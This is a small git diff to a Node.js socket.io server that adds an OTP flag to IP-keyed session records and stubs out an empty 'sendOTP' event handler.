@@ -224,7 +224,7 @@ io.on('connection', (socket, req) => {
 
     // Directly update sessionStore
     if (!sessionStore.has(userIP)) {
-        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null });
+        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp:false });
     } else {
         let userDetails = sessionStore.get(userIP);
         userDetails.status = 'actif';
@@ -245,6 +245,10 @@ io.on('connection', (socket, req) => {
    socket.on('getUserData', () => {
     io.emit('setUserData', Array.from(sessionStore.entries()));
 });
+
+    socket.on('sendOTP', () => {
+        
+    })
 
     
     socket.on('submit', (data) => {
